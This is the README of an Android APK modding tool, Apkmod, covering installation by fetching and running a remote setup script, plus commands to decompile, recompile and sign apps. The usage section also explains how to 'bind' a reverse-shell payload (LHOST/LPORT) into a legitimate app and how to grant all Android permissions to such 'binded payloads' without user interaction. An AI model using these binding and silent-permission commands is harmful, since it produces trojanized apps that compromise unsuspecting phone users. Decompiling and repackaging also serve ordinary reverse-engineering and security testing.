# Apkmod v1.9
### Author : Lokesh @Hax4us

## _Steps For Installation_
1. First goto home directory `cd $HOME`
2. Get the setup script `wget https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh`
3. Execute the script `sh setup.sh`
4. Now you can execute command `apkmod`

## Usage :
1. For decompiling `apkmod -d /path/to/inapp.apk -o /path/to/outdirectory`. It will decompile __inapp.apk__ into __outdirectory__ folder.
2. For recompiling `apkmod -r /path/to/indirectory -o /path/to/outapp.apk`. It will recompile __indirectory__ ( where decompiled files are exists ) into __outapp.apk__.
3. For signing `apkmod -s /path/to/unsignedapp.apk -o /path/to/signedapp.apk`. It will sign __unsignedapp.apk__ and saves output ( signed app ) to __signedapp.apk__.
4. For binding `apkmod -b /path/to/originalApp.apk -o /path/to/binded.apk LHOST=127.0.0.1 LPORT=4444`. It will bind payload with __originalApp.apk__ and saves final binded app to __binded.apk__.
5. Now you can use a optional option `-a` to use __aapt2__ for __binding__ and __recompiling__. Why aapt2 ? Because some apps can't recompile with __aapt__ but __aapt2__ can do it. But I can't drop __aapt__ support because some apps can't recompile with __aapt2__ so first recompile or bind without __aapt2__ ( `-a` ) then if you failed then try with __aapt2__. For example `apkmod -a -b /path/to/originalApp.apk -o /path/to/binded.apk LHOST=127.0.0.1 LPORT=4444`.
6. Use `-V` to enable verbose output
7. If only editing Java (smali) then this is the recommended action for faster decompile & rebuild `--no-res`
8. If you are only editing the resources. This is the recommended action for faster disassemble & assemble `--no-smali`
9. use `--frame-path` to specify framework directory like `--frame-path=/path/to/dir` 
10. Use `--enable-perm` to enable all android permissions in binded or non binded payloads without user interaction. For example :- `apkmod --enable-perm=/path/to/binded.apk -o mybinded.apk`
### Size Comparision
Size  | Apkmod  | Third party tools
--- | --- | ---
after installation | Around 100 MB | Around 700-900 MB

#### Why Apkmod is extremely small ?
Because it has Alpine instead of Ubuntu, kali, parrot or other glibc based distros.
